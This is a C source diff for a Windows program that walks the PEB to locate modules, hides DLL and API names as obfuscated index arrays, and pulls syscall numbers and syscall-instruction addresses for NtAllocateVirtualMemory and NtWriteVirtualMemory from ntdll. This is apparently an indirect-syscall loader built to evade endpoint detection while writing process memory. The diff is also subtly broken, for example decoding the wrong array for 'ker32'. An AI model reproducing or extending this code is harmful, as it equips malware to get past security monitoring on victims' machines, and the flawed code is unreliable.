@@ -92,7 +92,7 @@ typedef struct _TEB {
     PPEB ProcessEnvironmentBlock;
 } TEB, *PTEB;
 
-cool Getaddress(const char *vv) {
+cool Getaddress(const char *vv, const wchar_t *vvv) {
 #ifdef _M_X64
     PPEB peb = (PPEB)__readgsqword(0x60);
 #else
@@ -119,7 +119,7 @@ cool Getaddress(const char *vv) {
         
         wprintf(L"Loaded Module: %s\n", module->BaseDllName.Buffer);
         
-        if (_wcsicmp(module->BaseDllName.Buffer, L"NTDLL.DLL") == 0) {
+        if (_wcsicmp(module->BaseDllName.Buffer, vvv) == 0) {
             BYTE* baseAddress = (BYTE*)module->DllBase;
             IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
             IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
@@ -160,9 +160,11 @@ int main(int argc, char* argv[]) {
     //Get a handle to the ntdll.dll library
     //hello
     int ntt[] = { 13, 19, 3, 11, 11, 62, 3, 11, 11 };
+    wchar_t* ntd = getoriginal(ntt, big_string, sizeof(ntt));
     HMODULE hNtdll = GetModuleHandleA(getoriginal(ntt, big_string, sizeof(ntt)));
     
     int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
+    wchar_t* ker32 = getoriginal(ntt, big_string, sizeof(ws_lld_ker_32));
     HMODULE istfromKe__ws_ls_32 = GetModuleHandleA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)));
     
     int ntalloc_mem[] = { 39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
@@ -173,7 +175,7 @@ int main(int argc, char* argv[]) {
 
     int ntwrite_mem[] = { 39, 19, 48, 17, 8, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
     char* nt_write_V_mem=getoriginal(ntwrite_mem, big_string, sizeof(ntwrite_mem));
-    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)Getaddress(nt_write_V_mem);
+    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)Getaddress(nt_write_V_mem, ntd);
     wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
     sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
 
